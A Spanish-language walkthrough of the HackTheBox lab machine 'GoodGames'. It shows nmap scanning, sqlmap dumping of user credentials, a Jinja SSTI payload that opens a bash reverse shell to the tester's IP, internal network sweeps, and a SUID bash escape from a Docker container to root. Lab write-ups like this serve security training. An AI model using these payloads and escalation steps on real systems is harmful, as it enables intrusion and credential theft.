---
description: '✍️ Autor: TheCyberGeek🔍 Dificultad: Fácil 📅 Fecha de creación: 24/01/2022'
---

# GoodGames

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.11.130
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1278).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.11.130
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1279).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 80 (HTTP):** Este puerto generalmente está asociado a servidores web. Si el servicio está ejecutando un servidor web como Apache, Nginx o IIS, es recomendable buscar vulnerabilidades conocidas relacionadas con el software y versiones en uso (por ejemplo, a través de CVEs). Además, es importante realizar pruebas de seguridad en las aplicaciones web que se ejecutan en el servidor, como inyecciones SQL, Cross-Site Scripting (XSS) o vulnerabilidades de escalada de privilegios.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p80 -v 10.10.11.130
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (1280).png" alt=""><figcaption></figcaption></figure>

Accedemos al puerto 80.

<figure><img src="../../.gitbook/assets/image (1281).png" alt=""><figcaption></figcaption></figure>

Es una página de Juegos y tiene un Login vamos a usar entonces SQLMap.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-22 100654.png" alt=""><figcaption></figcaption></figure>

Conocer las bases de datos.

```
sqlmap -u http://10.10.11.130 --forms --dbs --batch
```

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Conocer las tablas de la base de datos objetivo.

```
sqlmap -u http://10.10.11.130 --forms -D main --tables --batch
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Conocer las columnas de la tabla de la bases de datos objetivo.

```
sqlmap -u http://10.10.11.130 --forms -D main -T user --columns --batch
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Conocer la información que hay en esas columnas.

```bash
sqlmap -u http://10.10.11.130 --forms -D main -T user -C name,id,email,password --dump --batch
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Hemos encontrado unas credenciales aunque la contraseña al ser un hash la crackeamos.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Después de analizar el sitio web del perfil, encontramos un símbolo de configuración que nos redirige a una URL con un dominio diferente. Como primer paso, registraremos este nuevo dominio en el archivo `/etc/hosts`.

```bash
echo "10.10.11.130 internal-administration.goodgames.htb" >> /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con esas credenciales.

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Con **Wappalyzer** se ejecuta **Python** por lo que parece una vulnerabilidad **SSTI**. Para ello realizamos la comprobación básica.

```
{{ 7 * 7 }}
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Es vulnerable a **SSTI** por lo que realizamos un payload que contiene una Reverse Shell.

```
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"').read() }}
```

Nos ponemos en escucha.

```bash
nc -nlvp 4444
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

somos **root.** No somos root de manera oficial.

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

La interfaz de red está conectada al adaptador de red interna con la dirección `172.19.0.2/16`, lo que nos permite comunicarnos con la red interna desde nuestra máquina de ataque a través de la red comprometida.

Para descubrir los hosts en la red interna, utilizamos el siguiente comando en una sola línea para realizar un escaneo de barrido:

```bash
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" &); done;
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Una vez identificado un objetivo, realizamos un escaneo de puertos con el siguiente comando:

```bash
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Comencé a buscar credenciales de SSH en la máquina y finalmente encontré la carpeta de un usuario dentro del directorio `/home`. Sin embargo, no encontré a `augustus` en el archivo `/etc/passwd`.

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que el puerto 22 y 80 están abiertos, por lo que intentamos conectarnos por SSH con el usuario augustus utilizando la contraseña que habíamos encontrado previamente (superadministrator).

```bash
ssh augustus@172.19.0.1
whoami
augustus
```

Como el directorio home del usuario augustus está montado en el contenedor **Docker** y tenemos acceso como usuario **root**, podemos trasladar un binario con permisos **SUID** al home de **augustus** para escalar privilegios a root en el host.

```bash
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ ls
bash  user.txt

root@3a453ab39d3d:/home/augustus chown root:root /home/augustus/bash  
root@3a453ab39d3d:/home/augustus chmod +s /home/augustus/bash

augustus@GoodGames:~$ ./bash -p
bash-5.1# id
uid=1000(augustus) gid=1000(augustus) euid=0(root) egid=0(root) groups=0(root),1000(augustus)
bash-5.1# whoami
root
```

Ahora que hemos logrado elevar nuestros privilegios a **root** en la máquina víctima, podemos proceder a leer la flag del usuario **root**.

<figure><img src="../../.gitbook/assets/image (1283).png" alt=""><figcaption></figcaption></figure>
